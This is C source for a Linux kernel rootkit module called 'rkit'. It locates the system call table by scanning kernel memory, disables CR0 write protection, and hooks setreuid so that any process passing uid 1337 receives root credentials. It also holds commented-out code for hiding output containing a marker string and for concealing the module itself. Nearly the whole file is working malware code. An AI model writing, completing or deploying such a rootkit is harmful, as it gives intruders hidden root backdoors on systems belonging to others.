#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>

int rkit_init(void);
void rkit_exit(void);
module_init(rkit_init);
module_exit(rkit_exit);

#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef uint64_t psize;

void setuid_root(void);
void spawn_root_shell(void);


/* function pointer for echo's and rkit_write's symbol */
asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
asmlinkage long (*o_setreuid)(uid_t real, uid_t effective); // defined in linux/syscalls.h

psize *sys_call_table; // ptr size

psize **
find(void)
/*
 * Match offset of the system call close (#defined as __NR_close)
 *     with addr of actual function symbol sys_close in order to
 *     find the base addr of the syscall table.
 */
{
    psize **sctable;
    psize i = START_CHECK;

    for(i = START_CHECK; i < END_CHECK; i += sizeof(void*)) {
        sctable = (psize **) i;
        if (sctable[__NR_close] == (psize *) sys_close) {
            return &sctable[0];
        }
    }
    return NULL;
}


asmlinkage long
rkit_setreuid(uid_t real, uid_t effective)
{
    struct cred *new;
    if(!(real == 1337 && effective == 1337)) {
        printk("using std setreuid as %d %d\n", real, effective);
        return o_setreuid(real, effective);
    }

    new = prepare_creds();
    new->uid = new->euid = make_kuid(current_user_ns(), 0);
    commit_creds(new);

    return 0;
}


asmlinkage ssize_t
rkit_write(int fd, const char __user *buff, ssize_t count)
/*
 * The "malicious" function whose address we insert in the table.
 */
{
    int r;
    char *proc_protect = "h1dd3n";
    char *kbuff = (char *) kmalloc(256, GFP_KERNEL);

    if(copy_from_user(kbuff, buff, 255)) {
        /* case: some bytes not copied */
    }
   
    /* if "h1dd3n" is found in buffer,
       then free the kernel-size text buffer and with errno
       EEXIST, effectively printing nothing. */
    if(strstr(kbuff, proc_protect)) {
        kfree(kbuff);
        return EEXIST; // == 17 ???
    }

    /* actually do the Write if special string not found */
    r = (*o_write)(fd, buff, count);
    kfree(kbuff);
    return r;
}


int
rkit_init(void)
/*
 * Find sys_call_table and replace appropriate entry with
 * addr of function rkit_write
 */
{
    //list_del_init(&__this_module.list);
    //kobject_del(&THIS_MODULE->mkobj.kobj);

    if ((sys_call_table = (psize *) find())) {
        printk("rkit: sys_call_table is at: %p\n", sys_call_table);
    } else {
        printk("rkit: sys_call_table not found\n");
    }

    // Disable P-mode so we can modify the read-only section of
    // the kernel containing the sys_call_table.
    write_cr0(read_cr0() & (~0x10000));

    // Save the original syscall write in ptr o_write after
    // xchg it with our special rkit_write function.
  //  o_write = (void *) xchg(&sys_call_table[__NR_write], (psize)rkit_write);
    o_setreuid = (void *) xchg(&sys_call_table[__NR_setreuid], (psize)rkit_setreuid);

    // Re-enable P-mode for security again
    write_cr0(read_cr0() | 0x10000);

    return 0;
}


void
rkit_exit(void)
/*
 * Undo the werke
 */
{
    // Do as in rkit_init, but put back in original write function addr
    write_cr0(read_cr0() & (~ 0x10000));
//    xchg(&sys_call_table[__NR_write], (psize)o_write);
    xchg(&sys_call_table[__NR_setreuid], (psize)o_setreuid);
    write_cr0(read_cr0() | 0x10000);
    printk("rkit: Module unloaded\n");
}

